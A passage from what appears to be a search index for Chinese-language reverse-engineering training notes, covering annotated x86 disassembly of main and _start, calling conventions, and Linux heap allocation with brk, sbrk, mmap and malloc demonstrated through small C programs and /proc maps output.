\u5206\u914d\u7a7a\u95f4\u5e76\u505a\u5230 16 \u5b57\u8282\u5bf9\u9f50\n   0x00000543 &lt;+6&gt;: call   0x5be &lt;__x86.get_pc_thunk.ax&gt;      ;\u8c03\u7528 &lt;__x86.get_pc_thunk.ax&gt; \u51fd\u6570\uff0c\u5c06 esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 eax\n   0x00000548 &lt;+11&gt;:    add    eax,0x1ab8                       ;eax+0x1ab8\n   0x0000054d &lt;+16&gt;:    mov    eax,DWORD PTR [ebp+0x8]          ;\u5c06 ebp+0x8 \u7684\u6570\u636e 0x1 \u4f20\u9001\u5230 eax\uff0cebp+0x4 \u4e3a\u51fd\u6570\u8fd4\u56de\u5730\u5740\n   0x00000550 &lt;+19&gt;:    mov    DWORD PTR [ebp-0x8],eax          ;\u4fdd\u5b58 eax \u7684\u503c 0x1 \u5230 ebp-0x8 \u7684\u4f4d\u7f6e\n   0x00000553 &lt;+22&gt;:    mov    eax,DWORD PTR [ebp+0xc]          ;\u5c06 ebp+0xc \u7684\u6570\u636e 0x2 \u4f20\u9001\u5230 eax\n   0x00000556 &lt;+25&gt;:    mov    DWORD PTR [ebp-0x4],eax          ;\u4fdd\u5b58 eax \u7684\u503c 0x2 \u5230 ebp-0x4 \u7684\u4f4d\u7f6e\n   0x00000559 &lt;+28&gt;:    mov    edx,DWORD PTR [ebp-0x8]          ;\u53d6\u51fa ebp-0x8 \u7684\u503c 0x1 \u5230 edx\n   0x0000055c &lt;+31&gt;:    mov    eax,DWORD PTR [ebp-0x4]          ;\u53d6\u51fa ebp-0x4 \u7684\u503c 0x2 \u5230 eax\n   0x0000055f &lt;+34&gt;:    add    eax,edx                          ;eax+edx\n   0x00000561 &lt;+36&gt;:    leave                                   ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e mov esp,ebp; pop ebp;\n   0x00000562 &lt;+37&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u5728 Linux \u73af\u5883\u4e0b\uff0c\u7531\u4e8e ELF \u6587\u4ef6\u7684\u5165\u53e3\u5176\u5b9e\u662f <code>_start</code> \u800c\u4e0d\u662f <code>main()</code>\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u5e94\u8be5\u5173\u6ce8\u4e0b\u9762\u7684\u51fd\u6570\uff1a</p> <pre><code>gdb-peda$ disassemble _start\nDump of assembler code for function _start:\n   0x00000400 &lt;+0&gt;: xor    ebp,ebp                            ;\u6e05\u96f6 ebp\uff0c\u8868\u793a\u4e0b\u9762\u7684 main() \u51fd\u6570\u6808\u5e27\u4e2d ebp \u4fdd\u5b58\u7684\u4e0a\u4e00\u7ea7 ebp \u4e3a 0x00000000\n   0x00000402 &lt;+2&gt;: pop    esi                                ;\u5c06 argc \u5b58\u5165 esi\n   0x00000403 &lt;+3&gt;: mov    ecx,esp                            ;\u5c06\u6808\u9876\u5730\u5740\uff08argv \u548c env \u6570\u7ec4\u7684\u5176\u5b9e\u5730\u5740\uff09\u4f20\u7ed9 ecx\n   0x00000405 &lt;+5&gt;: and    esp,0xfffffff0                     ;\u6808 16 \u5b57\u8282\u5bf9\u9f50\n   0x00000408 &lt;+8&gt;: push   eax                                ;eax\u3001esp\u3001edx \u5165\u6808\n   0x00000409 &lt;+9&gt;: push   esp\n   0x0000040a &lt;+10&gt;:    push   edx\n   0x0000040b &lt;+11&gt;:    call   0x432 &lt;_start+50&gt;                ;\u5148\u5c06\u4e0b\u4e00\u6761\u6307\u4ee4\u5730\u5740 0x00000410 \u538b\u6808\uff0c\u8bbe\u7f6e esp \u6307\u5411\u5b83\uff0c\u518d\u8c03\u7528 0x00000432 \u5904\u7684\u6307\u4ee4\n   0x00000410 &lt;+16&gt;:    add    ebx,0x1bf0                       ;ebx+0x1bf0\n   0x00000416 &lt;+22&gt;:    lea    eax,[ebx-0x19d0]                 ;\u53d6 &lt;__libc_csu_fini&gt; \u5730\u5740\u4f20\u7ed9 eax\uff0c\u7136\u540e\u538b\u6808\n   0x0000041c &lt;+28&gt;:    push   eax\n   0x0000041d &lt;+29&gt;:    lea    eax,[ebx-0x1a30]                 ;\u53d6 &lt;__libc_csu_init&gt; \u5730\u5740\u4f20\u5165 eax\uff0c\u7136\u540e\u538b\u6808\n   0x00000423 &lt;+35&gt;:    push   eax\n   0x00000424 &lt;+36&gt;:    push   ecx                              ;ecx\u3001esi \u5165\u6808\u4fdd\u5b58\n   0x00000425 &lt;+37&gt;:    push   esi\n   0x00000426 &lt;+38&gt;:    push   DWORD PTR [ebx-0x8]              ;\u8c03\u7528 main() \u51fd\u6570\u4e4b\u524d\u4fdd\u5b58\u8fd4\u56de\u5730\u5740\uff0c\u5176\u5b9e\u5c31\u662f\u4fdd\u5b58 main() \u51fd\u6570\u7684\u5165\u53e3\u5730\u5740\n   0x0000042c &lt;+44&gt;:    call   0x3e0 &lt;__libc_start_main@plt&gt;    ;call \u6307\u4ee4\u8c03\u7528 __libc_start_main \u51fd\u6570\n   0x00000431 &lt;+49&gt;:    hlt                                     ;hlt \u6307\u4ee4\u4f7f\u7a0b\u5e8f\u505c\u6b62\u8fd0\u884c\uff0c\u5904\u7406\u5668\u8fdb\u5165\u6682\u505c\u72b6\u6001\uff0c\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u4e0d\u5f71\u54cd\u6807\u5fd7\u3002\u5f53 RESET \u7ebf\u4e0a\u6709\u590d\u4f4d\u4fe1\u53f7\u3001CPU \u54cd\u5e94\u975e\u5c4f\u853d\u7ec8\u7aef\u3001CPU \u54cd\u5e94\u53ef\u5c4f\u853d\u7ec8\u7aef 3 \u79cd\u60c5\u51b5\u4e4b\u4e00\u65f6\uff0cCPU \u8131\u79bb\u6682\u505c\u72b6\u6001\uff0c\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4\n   0x00000432 &lt;+50&gt;:    mov    ebx,DWORD PTR [esp]              ;esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 ebx\n   0x00000435 &lt;+53&gt;:    ret                                     ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e pop eip;\n   0x00000436 &lt;+54&gt;:    xchg   ax,ax                            ;\u4ea4\u6362 ax \u548c ax \u7684\u6570\u636e\uff0c\u76f8\u5f53\u4e8e nop\n   0x00000438 &lt;+56&gt;:    xchg   ax,ax\n   0x0000043a &lt;+58&gt;:    xchg   ax,ax\n   0x0000043c &lt;+60&gt;:    xchg   ax,ax\n   0x0000043e &lt;+62&gt;:    xchg   ax,ax\nEnd of assembler dump.\n</code></pre>"},{"location":"Training/Material/Reverse/#_40","title":"\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a","text":"<p>\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u662f\u5bf9\u51fd\u6570\u8c03\u7528\u65f6\u5982\u4f55\u4f20\u9012\u53c2\u6570\u7684\u4e00\u79cd\u7ea6\u5b9a\u3002\u8c03\u7528\u51fd\u6570\u524d\u8981\u5148\u628a\u53c2\u6570\u538b\u5165\u6808\u7136\u540e\u518d\u4f20\u9012\u7ed9\u51fd\u6570\u3002</p> <p>\u4e00\u4e2a\u8c03\u7528\u7ea6\u5b9a\u5927\u6982\u6709\u5982\u4e0b\u7684\u5185\u5bb9\uff1a</p> <ul> <li>\u51fd\u6570\u53c2\u6570\u7684\u4f20\u9012\u987a\u5e8f\u548c\u65b9\u5f0f</li> <li>\u6808\u7684\u7ef4\u62a4\u65b9\u5f0f</li> <li>\u540d\u5b57\u4fee\u9970\u7684\u7b56\u7565</li> </ul> <p>\u4e3b\u8981\u7684\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u5982\u4e0b\uff0c\u5176\u4e2d cdecl \u662f C \u8bed\u8a00\u9ed8\u8ba4\u7684\u8c03\u7528\u7ea6\u5b9a\uff1a</p> \u8c03\u7528\u7ea6\u5b9a \u51fa\u6808\u65b9 \u53c2\u6570\u4f20\u9012 \u540d\u5b57\u4fee\u9970 cdecl \u51fd\u6570\u8c03\u7528\u65b9 \u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u53c2\u6570\u5165\u6808 \u4e0b\u5212\u7ebf\uff0b\u51fd\u6570\u540d stdcall \u51fd\u6570\u672c\u8eab \u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u53c2\u6570\u5165\u6808 \u4e0b\u5212\u7ebf\uff0b\u51fd\u6570\u540d\uff0b@\uff0b\u53c2\u6570\u7684\u5b57\u8282\u6570 fastcall \u51fd\u6570\u672c\u8eab \u90fd\u4e24\u4e2a DWORD\uff084 \u5b57\u8282\uff09\u7c7b\u578b\u6216\u8005\u5360\u66f4\u5c11\u5b57\u8282\u7684\u53c2\u6570\u88ab\u653e\u5165\u5bc4\u5b58\u5668\uff0c\u5176\u4ed6\u5269\u4e0b\u7684\u53c2\u6570\u6309\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u538b\u5165\u6808 @\uff0b\u51fd\u6570\u540d\uff0b@\uff0b\u53c2\u6570\u7684\u5b57\u8282\u6570 <p>\u9664\u4e86\u53c2\u6570\u7684\u4f20\u9012\u4e4b\u5916\uff0c\u51fd\u6570\u4e0e\u8c03\u7528\u65b9\u8fd8\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u503c\u8fdb\u884c\u4ea4\u4e92\u3002\u5f53\u8fd4\u56de\u503c\u4e0d\u5927\u4e8e 4 \u5b57\u8282\u65f6\uff0c\u8fd4\u56de\u503c\u5b58\u50a8\u5728 eax \u5bc4\u5b58\u5668\u4e2d\uff0c\u5f53\u8fd4\u56de\u503c\u5728 5~8 \u5b57\u8282\u65f6\uff0c\u91c7\u7528 eax \u548c edx \u7ed3\u5408\u7684\u5f62\u5f0f\u8fd4\u56de\uff0c\u5176\u4e2d eax \u5b58\u50a8\u4f4e 4 \u5b57\u8282\uff0c edx \u5b58\u50a8\u9ad8 4 \u5b57\u8282\u3002</p>"},{"location":"Training/Material/Reverse/#_41","title":"\u5806\u4e0e\u5185\u5b58\u7ba1\u7406","text":""},{"location":"Training/Material/Reverse/#_42","title":"\u5806","text":"<p>\u5806\u662f\u7528\u4e8e\u5b58\u653e\u9664\u4e86\u6808\u91cc\u7684\u4e1c\u897f\u4e4b\u5916\u6240\u6709\u5176\u4ed6\u4e1c\u897f\u7684\u5185\u5b58\u533a\u57df\uff0c\u6709\u52a8\u6001\u5185\u5b58\u5206\u914d\u5668\u8d1f\u8d23\u7ef4\u62a4\u3002\u5206\u914d\u5668\u5c06\u5806\u89c6\u4e3a\u4e00\u7ec4\u4e0d\u540c\u5927\u5c0f\u7684\u5757\uff08block\uff09\u7684\u96c6\u5408\u6765\u7ef4\u62a4\uff0c\u6bcf\u4e2a\u5757\u5c31\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u865a\u62df\u5185\u5b58\u5668\u7247\uff08chunk\uff09\u3002\u5f53\u4f7f\u7528 <code>malloc()</code> \u548c <code>free()</code> \u65f6\u5c31\u662f\u5728\u64cd\u4f5c\u5806\u4e2d\u7684\u5185\u5b58\u3002\u5bf9\u4e8e\u5806\u6765\u8bf4\uff0c\u91ca\u653e\u5de5\u4f5c\u7531\u7a0b\u5e8f\u5458\u63a7\u5236\uff0c\u5bb9\u6613\u4ea7\u751f\u5185\u5b58\u6cc4\u9732\u3002</p> <p>\u5806\u662f\u5411\u9ad8\u5730\u5740\u6269\u5c55\u7684\u6570\u636e\u7ed3\u6784\uff0c\u662f\u4e0d\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002\u8fd9\u662f\u7531\u4e8e\u7cfb\u7edf\u662f\u7528\u94fe\u8868\u6765\u5b58\u50a8\u7684\u7a7a\u95f2\u5185\u5b58\u5730\u5740\u7684\uff0c\u800c\u94fe\u8868\u7684\u904d\u5386\u65b9\u5411\u662f\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u3002\u5806\u7684\u5927\u5c0f\u53d7\u9650\u4e8e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u6709\u6548\u7684\u865a\u62df\u5185\u5b58\u3002\u7531\u6b64\u53ef\u89c1\uff0c\u5806\u83b7\u5f97\u7684\u7a7a\u95f4\u6bd4\u8f83\u7075\u6d3b\uff0c\u4e5f\u6bd4\u8f83\u5927\u3002</p> <p>\u5982\u679c\u6bcf\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\u90fd\u76f4\u63a5\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\uff0c\u4f1a\u4e25\u91cd\u5f71\u54cd\u7a0b\u5e8f\u7684\u6027\u80fd\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd0\u884c\u5e93\u5148\u5411\u64cd\u4f5c\u7cfb\u7edf\u201c\u6279\u53d1\u201d\u4e00\u5757\u8f83\u5927\u7684\u5806\u7a7a\u95f4\uff0c\u7136\u540e\u201c\u96f6\u552e\u201d\u7ed9\u7a0b\u5e8f\u4f7f\u7528\u3002\u5f53\u5168\u90e8\u201c\u552e\u5b8c\u201d\u4e4b\u540e\u6216\u8005\u5269\u4f59\u7a7a\u95f4\u4e0d\u80fd\u6ee1\u8db3\u7a0b\u5e8f\u7684\u9700\u6c42\u65f6\uff0c\u518d\u6839\u636e\u60c5\u51b5\u5411\u64cd\u4f5c\u7cfb\u7edf\u201c\u8fdb\u8d27\u201d\u3002</p>"},{"location":"Training/Material/Reverse/#_43","title":"\u8fdb\u7a0b\u5806\u7ba1\u7406","text":"<p>Linux \u63d0\u4f9b\u4e86\u4e24\u79cd\u5806\u7a7a\u95f4\u5206\u914d\u7684\u65b9\u5f0f\uff0c\u4e00\u4e2a\u662f <code>brk()</code> \u7cfb\u7edf\u8c03\u7528\uff0c\u53e6\u4e00\u4e2a\u662f <code>mmap()</code> \u7cfb\u7edf\u8c03\u7528\u3002\u53ef\u4ee5\u4f7f\u7528 <code>man brk</code>\u3001<code>man mmap</code> \u67e5\u770b\u3002</p> <p><code>brk()</code> \u7684\u58f0\u660e\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;unistd.h&gt;\n\nint brk(void *addr);\n\nvoid *sbrk(intptr_t increment);\n</code></pre> <p>\u53c2\u6570 <code>*addr</code> \u662f\u8fdb\u7a0b\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740\uff0c<code>brk()</code> \u901a\u8fc7\u6539\u53d8\u8be5\u5730\u5740\u6765\u6539\u53d8\u6570\u636e\u6bb5\u7684\u5927\u5c0f\uff0c\u5f53\u7ed3\u675f\u5730\u5740\u5411\u9ad8\u5730\u5740\u79fb\u52a8\uff0c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u589e\u5927\uff0c\u5f53\u7ed3\u675f\u5730\u5740\u5411\u4f4e\u5730\u5740\u79fb\u52a8\uff0c\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u51cf\u5c0f\u3002<code>brk()</code>\u8c03\u7528\u6210\u529f\u65f6\u8fd4\u56de 0\uff0c\u5931\u8d25\u65f6\u8fd4\u56de -1\u3002 <code>sbrk()</code> \u4e0e <code>brk()</code> \u7c7b\u4f3c\uff0c\u4f46\u662f\u53c2\u6570 <code>increment</code> \u8868\u793a\u589e\u91cf\uff0c\u5373\u589e\u52a0\u6216\u51cf\u5c11\u7684\u7a7a\u95f4\u5927\u5c0f\uff0c\u8c03\u7528\u6210\u529f\u65f6\u8fd4\u56de\u589e\u52a0\u540e\u51cf\u5c0f\u524d\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740\uff0c\u5931\u8d25\u65f6\u8fd4\u56de -1\u3002</p> <p>\u5728\u4e0a\u56fe\u4e2d\u6211\u4eec\u770b\u5230 brk \u6307\u793a\u5806\u7ed3\u675f\u5730\u5740\uff0cstart_brk \u6307\u793a\u5806\u5f00\u59cb\u5730\u5740\u3002BSS segment \u548c heap \u4e4b\u95f4\u6709\u4e00\u6bb5 Random brk offset\uff0c\u8fd9\u662f\u7531\u4e8e ASLR \u7684\u4f5c\u7528\uff0c\u5982\u679c\u5173\u95ed\u4e86 ASLR\uff0c\u5219 Random brk offset \u4e3a 0\uff0c\u5806\u7ed3\u675f\u5730\u5740\u548c\u6570\u636e\u6bb5\u5f00\u59cb\u5730\u5740\u91cd\u5408\u3002</p> <p>\u4f8b\u5b50\uff1a\u6e90\u7801</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\nvoid main() {\n        void *curr_brk, *tmp_brk, *pre_brk;\n\n        printf(\"\u5f53\u524d\u8fdb\u7a0b PID\uff1a%d\\n\", getpid());\n\n        tmp_brk = curr_brk = sbrk(0);\n        printf(\"\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk);\n        getchar();\n\n        brk(curr_brk+4096);\n        curr_brk = sbrk(0);\n        printf(\"brk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk);\n        getchar();\n\n        pre_brk = sbrk(4096);\n        curr_brk = sbrk(0);\n        printf(\"sbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a%p\\n\", pre_brk);\n        printf(\"sbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk);\n        getchar();\n\n        brk(tmp_brk);\n        curr_brk = sbrk(0);\n        printf(\"\u6062\u590d\u5230\u521d\u59cb\u5316\u65f6\u7684\u7ed3\u675f\u5730\u5740\uff1a%p\\n\", curr_brk);\n        getchar();\n}\n</code></pre> <p>\u5f00\u542f\u4e24\u4e2a\u7ec8\u7aef\uff0c\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u7a0b\u5e8f\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u89c2\u5bdf\u5185\u5b58\u5730\u5740\u3002\u9996\u5148\u6211\u4eec\u770b\u5173\u95ed\u4e86 ASLR \u7684\u60c5\u51b5\u3002\u7b2c\u4e00\u6b65\u521d\u59cb\u5316\uff1a</p> <pre><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space\n$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a27759\n\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000\n# cat /proc/27759/maps\n...\n56557000-56558000 rw-p 00001000 08:01 28587506                           /home/a.out\n56558000-56579000 rw-p 00000000 00:00 0                                  [heap]\n...\n</code></pre> <p>\u6570\u636e\u6bb5\u7ed3\u675f\u5730\u5740\u548c\u5806\u5f00\u59cb\u5730\u5740\u540c\u4e3a <code>0x56558000</code>\uff0c\u5806\u7ed3\u675f\u5730\u5740\u4e3a <code>0x56579000</code>\u3002</p> <p>\u7b2c\u4e8c\u6b65\u4f7f\u7528 <code>brk()</code> \u589e\u52a0\u5806\u7a7a\u95f4\uff1a</p> <pre><code>$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a27759\n\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000\n\nbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000\n# cat /proc/27759/maps\n...\n56557000-56558000 rw-p 00001000 08:01 28587506                           /home/a.out\n56558000-5657a000 rw-p 00000000 00:00 0                                  [heap]\n...\n</code></pre> <p>\u5806\u5f00\u59cb\u5730\u5740\u4e0d\u53d8\uff0c\u7ed3\u675f\u5730\u5740\u589e\u52a0\u4e3a <code>0x5657a000</code>\u3002</p> <p>\u7b2c\u4e09\u6b65\u4f7f\u7528 <code>sbrk()</code> \u589e\u52a0\u5806\u7a7a\u95f4\uff1a</p> <pre><code>$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a27759\n\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000\n\nbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000\n\nsbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a0x5657a000\nsbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657b000\n# cat /proc/27759/maps\n...\n56557000-56558000 rw-p 00001000 08:01 28587506                           /home/a.out\n56558000-5657b000 rw-p 00000000 00:00 0                                  [heap]\n...\n</code></pre> <p>\u7b2c\u56db\u6b65\u51cf\u5c0f\u5806\u7a7a\u95f4\uff1a</p> <pre><code>$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a27759\n\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000\n\nbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657a000\n\nsbrk \u8fd4\u56de\u503c\uff08\u5373\u4e4b\u524d\u7684\u7ed3\u675f\u5730\u5740\uff09\uff1a0x5657a000\nsbrk \u4e4b\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x5657b000\n\n\u6062\u590d\u5230\u521d\u59cb\u5316\u65f6\u7684\u7ed3\u675f\u5730\u5740\uff1a0x56579000\n# cat /proc/27759/maps\n...\n56557000-56558000 rw-p 00001000 08:01 28587506                           /home/a.out\n56558000-56579000 rw-p 00000000 00:00 0                                  [heap]\n...\n</code></pre> <p>\u518d\u6765\u770b\u4e00\u4e0b\u5f00\u542f\u4e86 ASLR \u7684\u60c5\u51b5\uff1a</p> <pre><code># echo 2 &gt; /proc/sys/kernel/randomize_va_space\n$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a28025\n\u521d\u59cb\u5316\u540e\u7684\u7ed3\u675f\u5730\u5740\uff1a0x578ad000\n# cat /proc/28025/maps\n...\n5663f000-56640000 rw-p 00001000 08:01 28587506                           /home/a.out\n5788c000-578ad000 rw-p 00000000 00:00 0                                  [heap]\n...\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u65f6\u6570\u636e\u6bb5\u7684\u7ed3\u675f\u5730\u5740 <code>0x56640000</code> \u4e0d\u7b49\u4e8e\u5806\u7684\u5f00\u59cb\u5730\u5740 <code>0x5788c000</code>\u3002</p> <p><code>mmap()</code> \u7684\u58f0\u660e\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;sys/mman.h&gt;\n\nvoid *mmap(void *addr, size_t len, int prot, int flags,\n    int fildes, off_t off);\n</code></pre> <p><code>mmap()</code> \u51fd\u6570\u7528\u4e8e\u521b\u5efa\u65b0\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u5e76\u5c06\u5bf9\u8c61\u6620\u5c04\u5230\u8fd9\u4e9b\u533a\u57df\u4e2d\uff0c\u5f53\u5b83\u4e0d\u5c06\u5730\u5740\u7a7a\u95f4\u6620\u5c04\u5230\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u6211\u4eec\u79f0\u8fd9\u5757\u7a7a\u95f4\u4e3a\u533f\u540d\uff08Anonymous\uff09\u7a7a\u95f4\uff0c\u533f\u540d\u7a7a\u95f4\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u5806\u7a7a\u95f4\u3002<code>mmap()</code> \u51fd\u6570\u8981\u6c42\u5185\u6838\u521b\u5efa\u4e00\u4e2a\u4ece\u5730\u5740 <code>addr</code> \u5f00\u59cb\u7684\u65b0\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u5e76\u5c06\u6587\u4ef6\u63cf\u8ff0\u7b26 <code>fildes</code> \u6307\u5b9a\u7684\u5bf9\u8c61\u7684\u4e00\u4e2a\u8fde\u7eed\u7684\u7247\uff08chunk\uff09\u6620\u5c04\u5230\u8fd9\u4e2a\u65b0\u533a\u57df\u3002\u8fde\u7eed\u7684\u5bf9\u8c61\u7247\u5927\u5c0f\u4e3a <code>len</code> \u5b57\u8282\uff0c\u4ece\u8ddd\u6587\u4ef6\u5f00\u59cb\u5904\u504f\u79fb\u91cf\u4e3a <code>off</code> \u5b57\u8282\u7684\u5730\u65b9\u5f00\u59cb\u3002<code>prot</code> \u63cf\u8ff0\u865a\u62df\u5185\u5b58\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u4f4d\uff0c<code>flags</code> \u63cf\u8ff0\u88ab\u6620\u5c04\u5bf9\u8c61\u7c7b\u578b\u7684\u4f4d\u7ec4\u6210\u3002</p> <p><code>munmap()</code> \u5219\u7528\u4e8e\u5220\u9664\u865a\u62df\u5185\u5b58\u533a\u57df\uff1a</p> <pre><code>#include &lt;sys/mman.h&gt;\n\nint munmap(void *addr, size_t len);\n</code></pre> <p>\u4f8b\u5b50\uff1a\u6e90\u7801</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;unistd.h&gt;\nvoid main() {\n    void *curr_brk;\n\n    printf(\"\u5f53\u524d\u8fdb\u7a0b PID\uff1a%d\\n\", getpid());\n    printf(\"\u521d\u59cb\u5316\u540e\\n\");\n    getchar();\n\n    char *addr;\n    addr = mmap(NULL, (size_t)4096, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);\n    printf(\"mmap \u5b8c\u6210\\n\");\n    getchar();\n\n    munmap(addr, (size_t)4096);\n    printf(\"munmap \u5b8c\u6210\\n\");\n    getchar();\n}\n</code></pre> <p>\u7b2c\u4e00\u6b65\u521d\u59cb\u5316\uff1a</p> <pre><code>$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a28652\n\u521d\u59cb\u5316\u540e\n# cat /proc/28652/maps\n...\nf76b2000-f76b5000 rw-p 00000000 00:00 0\nf76ef000-f76f1000 rw-p 00000000 00:00 0\n...\n</code></pre> <p>\u7b2c\u4e8c\u6b65 mmap\uff1a</p> <pre><code>]$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a28652\n\u521d\u59cb\u5316\u540e\nmmap \u5b8c\u6210\n# cat /proc/28652/maps\n...\nf76b2000-f76b5000 rw-p 00000000 00:00 0\nf76ee000-f76f1000 rw-p 00000000 00:00 0\n...\n</code></pre> <p>\u7b2c\u4e09\u6b65 munmap\uff1a</p> <pre><code>$ ./a.out\n\u5f53\u524d\u8fdb\u7a0b PID\uff1a28652\n\u521d\u59cb\u5316\u540e\nmmap \u5b8c\u6210\nmunmap \u5b8c\u6210\n# cat /proc/28652/maps\n...\nf76b2000-f76b5000 rw-p 00000000 00:00 0\nf76ef000-f76f1000 rw-p 00000000 00:00 0\n...\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c\u4e8c\u884c\u7b2c\u4e00\u5217\u5730\u5740\u4ece <code>f76ef000</code>-&gt;<code>f76ee000</code>-&gt;<code>f76ef000</code> \u53d8\u5316\u3002<code>0xf76ee000-0xf76ef000=0x1000=4096</code>\u3002</p> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528 <code>brk()</code> \u548c <code>mmap()</code> \u6765\u5206\u914d\u5806\u7a7a\u95f4\uff0cC \u6807\u51c6\u5e93\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53eb\u505a <code>malloc</code> \u7684\u5206\u914d\u5668\uff0c\u7a0b\u5e8f\u901a\u8fc7\u8c03\u7528 <code>malloc()</code> \u51fd\u6570\u6765\u4ece\u5806\u4e2d\u5206\u914d\u5757\uff0c\u58f0\u660e\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;stdlib.h&gt;\n\nvoid *malloc(size_t size);\nvoid free(void *ptr);\nvoid *calloc(size_t nmemb, size_t size);\nvoid *realloc(void *ptr, size_t size);\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;malloc.h&gt;\nvoid foo(int n) {\n    int *p;\n    p = (int *)malloc(n * sizeof(int));\n\n    for (int i=0; i&lt;n; i++) {\n        p[i] = i;\n        printf(\"%d \", p[i]);\n    }\n    printf(\"\\n\");\n\n    free(p);\n}\n\nvoid main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n\n    foo(n);\n}\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\uff1a</p> <pre><code>$ ./malloc\n4\n0 1 2 3\n$ ./malloc\n8\n0 1 2 3 4 5 6 7\n$ ./malloc\n16\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\n</code></pre> <p>\u4f7f\u7528 gdb \u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff1a</p> <pre><code>gdb-peda$ disassemble foo\nDump of assembler code for function foo:\n   0x0000066d &lt;+0&gt;:     push   ebp\n   0x0000066e &lt;+1&gt;:     mov    ebp,esp\n   0x00000670 &lt;+3&gt;:     push   ebx\n   0x00000671 &lt;+4&gt;:     sub    esp,0x14\n   0x00000674 &lt;+7&gt;:     call   0x570 &lt;__x86.get_pc_thunk.bx&gt;\n   0x00000679 &lt;+12&gt;:    add    ebx,0x1987\n   0x0000067f &lt;+18&gt;:    mov    eax,DWORD PTR [ebp+0x8]\n   0x00000682 &lt;+21&gt;:    shl    eax,0x2\n   0x00000685 &lt;+24&gt;:    sub    esp,0xc\n   0x00000688 &lt;+27&gt;:    push   eax\n   0x00000689 &lt;+28&gt;:    call   0x4e0 &lt;malloc@plt&gt;\n   0x0000068e &lt;+33&gt;:    add    esp,0x10\n   0x00000691 &lt;+36&gt;:  